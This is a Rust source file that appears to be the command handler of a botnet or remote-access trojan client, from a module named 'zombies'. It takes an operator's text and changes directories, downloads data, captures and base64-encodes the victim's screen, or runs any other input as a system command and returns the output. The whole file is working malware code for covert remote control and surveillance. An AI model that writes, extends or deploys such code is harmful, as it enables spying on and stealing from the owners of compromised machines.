use crate::zombies::commands::{cd::cd_to_dir, download::download_data, see_screen::see_screen};
use base64::{prelude::BASE64_STANDARD, Engine};
use std::{
    io::{Error, ErrorKind},
    process::Command,
};
use tracing::info;

pub fn run_command(text: &str) -> Result<String, Error> {
    let args: Vec<&str> = text.split_whitespace().collect();
    let command = args[0];

    if command.is_empty() {
        return Err(Error::new(ErrorKind::InvalidInput, "No command specified"));
    }

    info!("Running command: {:?}", text);

    if command == "cd" {
        match cd_to_dir(&args) {
            Ok(data) => {
                return Ok(data);
            }
            Err(e) => {
                info!("Failed to change directory: {}", e);
                return Err(Error::new(
                    ErrorKind::Other,
                    format!("Failed to change directory: {}", e),
                ));
            }
        }
    }

    if command == "download" {
        match download_data(&args) {
            Ok(data) => {
                return Ok(data);
            }
            Err(e) => {
                info!("Failed to download data: {}", e);
                return Err(Error::new(
                    ErrorKind::Other,
                    format!("Failed to download data: {}", e),
                ));
            }
        }
    }

    if command == "watch_screen" {
        info!("Running see-screen command");
        match see_screen() {
            Ok(data) => {
                return Ok(String::from(format!(
                    "see-screen--{}",
                    BASE64_STANDARD.encode(data)
                )));
            }
            Err(e) => {
                info!("Failed to capture screen: {}", e);
                return Err(Error::new(
                    ErrorKind::Other,
                    format!("Failed to capture screen: {}", e),
                ));
            }
        }
    }

    let output = Command::new(args[0])
        .args(&args[1..])
        .output()
        .map_err(|e| {
            info!("Failed to execute command: {}", e);
            Error::new(
                ErrorKind::Other,
                format!("Failed to execute command: {}", e),
            )
        })?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();

    info!("Command output: {}", stdout);

    Ok(stdout)
}
